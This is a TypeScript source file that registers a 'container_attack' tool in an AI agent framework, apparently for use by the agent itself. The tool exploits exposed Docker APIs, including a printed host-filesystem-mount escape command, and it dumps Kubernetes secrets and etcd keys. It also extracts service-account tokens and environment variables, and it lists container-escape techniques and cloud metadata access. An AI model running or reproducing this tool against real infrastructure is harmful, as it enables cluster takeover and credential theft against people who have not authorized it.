export * as ContainerAttackTool from "./container-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "container_attack"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Container attack: 'docker_api' (exploit exposed Docker API TCP 2375), 'k8s_enum' (enumerate pods/services), 'k8s_secrets' (dump kube secrets), 'k8s_escape' (container escape via privileged pod), 'etcd_dump' (dump etcd database), 'kube_token' (extract service account token from /var/run/secrets)",
  }),
  target: Schema.String.pipe(Schema.optional).annotate({ description: "Target host:port for Docker API or k8s API server" }),
  namespace: Schema.String.pipe(Schema.optional).annotate({ description: "K8s namespace. Default: default." }),
  pod: Schema.String.pipe(Schema.optional).annotate({ description: "Specific pod name for operations." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `Container and Kubernetes exploitation. Exploit exposed Docker API (TCP 2375) for container creation/host escape, enumerate K8s pods/services/secrets via kubectl, dump etcd database, extract service account tokens, and perform container escapes via privileged pods. Essential for cloud-native infrastructure attacks.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

            switch (input.action) {
              case "docker_api": {
                if (!input.target) return { output: "ERROR: 'target' (host:2375) required for docker_api." }
                const results: string[] = [`=== DOCKER API EXPLOITATION: ${input.target} ===`]
                // List containers
                const listCmd = ChildProcess.make("curl", ["-s", `http://${input.target}/containers/json`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const listResult = yield* appProcess.run(listCmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("--- RUNNING CONTAINERS ---")
                results.push(listResult?.output?.toString("utf8") ?? "[]")
                // List images
                const imgCmd = ChildProcess.make("curl", ["-s", `http://${input.target}/images/json`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const imgResult = yield* appProcess.run(imgCmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("\n--- IMAGES ---")
                results.push(imgResult?.output?.toString("utf8") ?? "[]")
                // Check version
                const verCmd = ChildProcess.make("curl", ["-s", `http://${input.target}/version`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                const verResult = yield* appProcess.run(verCmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                results.push("\n--- DOCKER VERSION ---")
                results.push(verResult?.output?.toString("utf8") ?? "unknown")

                results.push("\n[CRITICAL] Docker API exposed without authentication!")
                results.push("To get a shell on the host, create a container mounting the host filesystem:")
                results.push(`curl -X POST http://${input.target}/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"]}}'`)

                return { exit: 0, output: results.join("\n") }
              }

              case "k8s_enum": {
                const ns = input.namespace ?? "default"
                const results: string[] = [`=== K8S ENUMERATION (ns: ${ns}) ===`]
                const cmds = [
                  ["get", ["pods", "-n", ns, "-o", "wide"]],
                  ["get", ["svc", "-n", ns]],
                  ["get", ["deployments", "-n", ns]],
                  ["get", ["nodes", "-o", "wide"]],
                  ["get", ["namespaces"]],
                  ["get", ["configmaps", "-n", ns]],
                ]
                for (const [sub, a] of cmds) {
                  const cmd = ChildProcess.make("kubectl", ["get", ...a] as string[], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  results.push(`--- kubectl ${sub} ---`)
                  results.push(r?.output?.toString("utf8") ?? "(error)")
                }
                return { exit: 0, output: results.join("\n") }
              }

              case "k8s_secrets": {
                const ns = input.namespace ?? "default"
                const cmd = ChildProcess.make("kubectl", ["get", "secrets", "-n", ns, "-o", "yaml"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return {
                  exit: result?.exitCode,
                  output: result?.output?.toString("utf8") ?? "kubectl not found or no secrets. Install: https://kubernetes.io/docs/tasks/tools/",
                }
              }

              case "k8s_escape": {
                return {
                  output: `Container Escape Techniques:
1. Privileged pod — if you can create pods, mount host filesystem:
   kubectl run pwn --image=alpine --privileged --restart=Never -- chroot /host

2. Mount host docker.sock:
   kubectl run docker --image=docker -v /var/run/docker.sock:/var/run/docker.sock

3. Host PID namespace:
   kubectl run pid --image=alpine --pid=host -- nsenter -t 1 -m -u -i -n sh

4. Capabilities abuse (CAP_SYS_ADMIN, CAP_SYS_PTRACE):
   Check: cat /proc/1/status | grep Cap
   Decode: capsh --decode=<hex>

5. Kernel exploit from container (if not isolated)

6. Cloud metadata access from pod:
   curl http://169.254.169.254/latest/meta-data/`,
                }
              }

              case "etcd_dump": {
                if (!input.target) return { output: "ERROR: 'target' (etcd host:2379) required." }
                const cmd = ChildProcess.make("etcdctl", ["--endpoints", `http://${input.target}`, "get", "/", "--prefix", "--keys-only"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 10 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return {
                  exit: result?.exitCode,
                  output: result?.output?.toString("utf8") ?? "etcdctl failed. etcd typically runs on port 2379. Try: ETCDCTL_API=3 etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only",
                }
              }

              case "kube_token": {
                const results: string[] = ["=== SERVICE ACCOUNT TOKEN EXTRACTION ==="]
                const cmds = [
                  ["cat", ["/var/run/secrets/kubernetes.io/serviceaccount/token"]],
                  ["cat", ["/var/run/secrets/kubernetes.io/serviceaccount/namespace"]],
                  ["cat", ["/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"]],
                  ["env", []],
                ]
                for (const [t, a] of cmds) {
                  const cmd = ChildProcess.make(t as string, a as string[], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(10), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  if (r?.output) results.push(r.output.toString("utf8"))
                }
                return { exit: 0, output: results.join("\n") }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: docker_api, k8s_enum, k8s_secrets, k8s_escape, etcd_dump, kube_token` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "Container attack failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/container-attack",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
